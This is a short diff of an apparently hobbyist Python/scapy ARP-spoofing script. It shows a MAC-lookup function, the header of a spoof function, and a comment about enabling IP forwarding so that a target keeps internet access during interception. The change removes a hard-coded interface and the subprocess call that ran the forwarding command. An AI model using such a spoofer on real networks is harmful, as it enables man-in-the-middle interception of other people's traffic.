@@ -8,7 +8,7 @@ def get_mac(ip):
     arp_request = s.ARP(pdst=ip)
     broadcast = s.Ether(dst="ff:ff:ff:ff:ff:ff")
     arp_request_broadcast = broadcast/arp_request
-    answered_list = s.srp(arp_request_broadcast, iface="eth0", timeout=1, verbose=False)[0]
+    answered_list = s.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
     return answered_list[0][1].hwsrc
    
 def spoof(targetip,spoofip):
@@ -20,9 +20,6 @@ def spoof(targetip,spoofip):
 
 #Port forwarding so target can still use internet
 bashCommand = "echo 1 > /proc/sys/net/ipv4/ip_forward"
-process = subprocess.Popen(bashCommand.split(), stdout=subprocess.PIPE)
-output, error = process.communicate()
-
 targetip=""
 spoofip=""
 
